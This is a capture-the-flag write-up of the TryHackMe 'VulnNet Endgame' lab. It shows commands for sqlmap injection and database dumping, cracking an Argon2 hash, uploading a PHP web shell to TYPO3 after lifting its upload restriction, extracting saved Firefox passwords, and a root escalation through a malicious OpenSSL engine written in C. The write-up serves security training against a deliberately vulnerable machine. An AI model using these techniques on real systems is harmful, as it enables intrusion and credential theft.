---
title: "TryHackMe: VulnNet Endgame Walkthrough"
categories: [Writeups]
tags: [Writeups, TryHackMe]
image:
  path: assets/img/posts/tryhackme/vulnnet-endgame/logo.png
---

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image.png)

## Introduction

This room simulates a vulnerable infrastructure designed to test real‑world enumeration and exploitation skills. There are no puzzles or guesswork involved — **thorough enumeration is the key to success**.

The VulnNet series concludes with this final challenge, requiring full system compromise.

## Enumeration

As with any CTF, the first step is comprehensive enumeration to identify the exposed attack surface.

### Port Enumeration

An initial full TCP port scan was performed to discover open services:

```bash
$ nmap -p- 10.64.153.77 -T5 -sT -vvv
```

**Results**

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

### Web Page

Navigating to `http://10.64.153.77` reveals a simple web page:

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%201.png)

No immediately interesting functionality or input vectors were identified on the landing page.

### Directory Enumeration

To identify hidden content, directory enumeration was performed using **Gobuster**:

```bash
$ gobuster dir -u http://vulnnet.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,.html
```

This enumeration did not reveal any useful directories or files.

### Subdomain Enumeration

With directory brute‑forcing yielding no results, the next step was to enumerate potential subdomains that might expose additional attack surface.

```bash
$ gobuster vhost -u http://vulnnet.thm/ -w /usr/share/wordlists/dirb/big.txt -t 50 --append-domain
```

**Results**

```bash
Blog.vulnnet.thm
api.vulnnet.thm
blog.vulnnet.thm
fundraising_2007.vulnnet.thm
shop.vulnnet.thm 
admin1.vulnnet.thm
```

To properly access these virtual hosts, the discovered subdomains were added to `/etc/hosts`:

```bash
10.64.153.77 vulnnet.thm admin1.vulnnet.thm blog.vulnnet.thm api.vulnnet.thm shop.vulnnet.thm fundraising_2007.vulnnet.thm
```

Each subdomain was then manually browsed to identify potential entry points and vulnerabilities.

Since the text form the challenge says that “enumeration is key” we surely need to enumerate a little more each subdomain

### **api.vulnnet.thm**

```bash
$ gobuster dir -u http://api.vulnnet.thm -w /usr/share/wordlists/dirb/common.txt
```

**Results**

```bash
/index.php            (Status: 200) [Size: 18]
```

### shop.vulnnet.thm

```bash
$ gobuster dir -u http://shop.vulnnet.thm -w /usr/share/wordlists/dirb/common.txt
```

**Results**

```bash
/css                  (Status: 301) [Size: 318] [--> http://shop.vulnnet.thm/css/]
/fonts                (Status: 301) [Size: 320] [--> http://shop.vulnnet.thm/fonts/]
/icon                 (Status: 301) [Size: 319] [--> http://shop.vulnnet.thm/icon/]
/images               (Status: 301) [Size: 321] [--> http://shop.vulnnet.thm/images/]
/index.html           (Status: 200) [Size: 26701]
/js                   (Status: 301) [Size: 317] [--> http://shop.vulnnet.thm/js/]
```

### fundraising_2007.vulnnet.thm

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%202.png)

### **admin1.vulnnet.thm**

```bash
$ gobuster dir -u http://admin1.vulnnet.thm -w /usr/share/wordlists/dirb/common.txt 
```

**Results**

```bash
/en                   (Status: 301) [Size: 321] [--> http://admin1.vulnnet.thm/en/]
/fileadmin            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/fileadmin/]
/typo3                (Status: 301) [Size: 324] [--> http://admin1.vulnnet.thm/typo3/]
/typo3conf            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/typo3conf/]
/typo3temp            (Status: 301) [Size: 328] [--> http://admin1.vulnnet.thm/typo3temp/]
/vendor               (Status: 301) [Size: 325] [--> http://admin1.vulnnet.thm/vendor/]
```

The presence of the `/typo3`, `/typo3conf`, and `/typo3temp` directories confirms the site is built on **TYPO3**, a robust, open-source Enterprise Content Management System (CMS).

This particular subdomain stands out as the most promising target for further exploration.

By navigating the identified directory structure, I successfully located the **TYPO3 administrative login interface.**

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%203.png)

Default credentials of admin:admin, admin:password, admin:administrator did not work.

### blog.vulnnet.thm

```bash
$ gobuster dir -u http://blog.vulnnet.thm -w /usr/share/wordlists/dirb/common.txt
```

**Results**

```bash
/assets               (Status: 301) [Size: 321] [--> http://blog.vulnnet.thm/assets/]
/index.html           (Status: 200) [Size: 19316]
/index.php            (Status: 200) [Size: 96]
```

Analyzing the source code of the posts I was able to get another endpoint

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%204.png)

```bash
http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=2
```

After initial testing for **Local File Inclusion (LFI)** and **Insecure Direct Object References (IDOR)** yielded no results, I shifted focus toward the data-handling logic of the application. Recognizing that the `?blog=` parameter is possibly used to fetch dynamic content from a database, I performed a targeted vulnerability scan using **sqlmap**.

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%205.png)

The analysis confirmed that the GET parameter is injectable!

## SQLi & Database Enumeration

This parameter was tested for SQL injection using **sqlmap**:

```bash
$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbs
```

**Results**

```bash
available databases [3]:
[*] blog
[*] information_schema
[*] vn_admin
```

A quick search indicated that **TYPO3 CMS** commonly uses a database named `vn_admin`, so this database was prioritized for enumeration.

The `be_users` table was dumped to retrieve backend user credentials:

```bash
$ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -D vn_admin -T be_users -C "admin,username,password" --dump
```

This produced several usernames and password hashes, including the user `chris_w` .

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%206.png)

The password hash used **Argon2**, making brute-forcing with a large wordlist (e.g., `rockyou.txt`) computationally expensive.

Since another database (`blog`) was available, it was dumped as well:

```bash
sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -D blog -T users --dump
```

This yielded multiple plaintext passwords associated with blog users. These were repurposed as a targeted wordlist for cracking the TYPO3 admin hash.

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%207.png)

The extracted Argon2 hash for `chris_w` was saved and I used the blog passwords as a custom wordlist:

```bash
$ echo '$argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg' > hash.txt
$ john --format=argon2 --wordlist=/home/drouxinol/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv hash.txt
```

The password was successfully cracked:

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%208.png)

### TYPO3 CMS Access

These credentials provided access to the TYPO3 administrative interface

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%209.png)

Since TYPO3 is a PHP-based CMS, gaining backend access often enables file upload or configuration manipulation, making it a strong candidate for remote code execution.

## Web Shell

Within the TYPO3 admin panel, the **Filelist** module was used to attempt a PHP shell upload.

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%2010.png)

Initially, PHP uploads were blocked due to a restrictive configuration (`FileDenyPattern`).

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%2011.png)

This restriction was removed by editing the configuration, allowing PHP files to be uploaded.

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%2012.png)

A PHP web shell (P0wny Shell) was then uploaded:

[https://github.com/flozz/p0wny-shell](https://github.com/flozz/p0wny-shell)

After uploading, browsing to:

```bash
/fileadmin/shell.php
```

confirmed successful remote command execution.

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%2013.png)

### Initial Foothold

Accessing the shell revealed the current user:

```bash
www-data@vulnnet-endgame:…/www/admin1# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed a standard web server foothold as **www-data**.

### Credential Extraction

During local enumeration as `www-data`, the `/home` directory revealed a user account named `system`. However, the web server user lacked sufficient permissions to access the home directory directly.
Further inspection identified a `.mozilla` directory within the user profile, suggesting stored Firefox credentials that could potentially be recovered.

### **Extracting the Firefox Profile**

The `.mozilla` directory was archived for offline analysis:

```bash
zip /tmp/mozilla.zip .mozilla -r
```

The archive was then transferred to the attacker machine for credential extraction.

### Firefox Credential Decryption

Reviewing the extracted Firefox profiles showed that only the profile:

```bash
2fjnrwth.default-release
```

contained a `logins.json` file, indicating stored credentials.

![image.png](assets/img/posts/tryhackme/vulnnet-endgame/image%2014.png)

The tool **firefox_decrypt.py** was used to extract saved passwords:

[https://github.com/unode/firefox_decrypt/blob/main/firefox_decrypt.py](https://github.com/unode/firefox_decrypt/blob/main/firefox_decrypt.py)

Initially, the correct profile did not appear in the selection menu. Inspecting the `profiles.ini` file revealed the proper profile path:

```bash
Path=2fjnrwth.default-release
```

After updating the profile configuration accordingly, the script successfully decrypted stored credentials:

```bash
python3 firefox_decrypt.py firefox/
```

Ran the python script once again and could get the crendentials of `chris_w` 

```bash
$ python3 firefox_decrypt.py firefox/
Select the Mozilla profile you wish to decrypt
1 -> 2fjnrwth.default-release
2 -> 8mk7ix79.default-release
1

Website:   https://tryhackme.com
Username: 'chris_w@vulnnet.thm'
Password: '8y7TKQDpucKBYhwsb'
```

## **SSH Access**

Using the recovered credentials, SSH access was obtained as the `system` user:

```bash
system@vulnnet-endgame:~$ id
uid=1000(system) gid=1000(system) groups=1000(system)
```

Access was confirmed:

```bash
system@vulnnet-endgame:~$ cat user.txt
THM{REDACTED}
```

## Privilege Escalation

To identify escalation vectors, **LinPEAS** was uploaded and executed. The scan revealed a suspicious binary:

```bash
Files with capabilities (limited to 50):
/home/system/Utils/openssl =ep
/snap/core20/1081/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep

```

This indicates the OpenSSL binary has elevated capabilities, making it a strong candidate for privilege escalation.

[OpenSSL Privilege Escalation - Exploit Notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/openssl/)

A malicious OpenSSL engine was created:

```bash
#include <openssl/engine.h>
#include <unistd.h>
#include <sys/types.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0); setgid(0);
    system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

The compiled shared object was transferred to the target machine.

```bash
$ gcc -fPIC -o exploit.o -c exploit.c
$ gcc -shared -o exploit.so -lcrypto exploit.o
```

The malicious engine was executed using the vulnerable OpenSSL binary:

```bash
chmod +x exploit.so
/home/system/Utils/openssl req -engine ./exploit.so
```

This successfully spawned a root shell:

```bash
root@vulnnet-endgame:/tmp# id
uid=0(root) gid=0(root)
```

With root privileges obtained, the final flag was retrieved:

```bash
root@vulnnet-endgame:/root/thm-flag# cat root.txt 
THM{REDACTED}
```
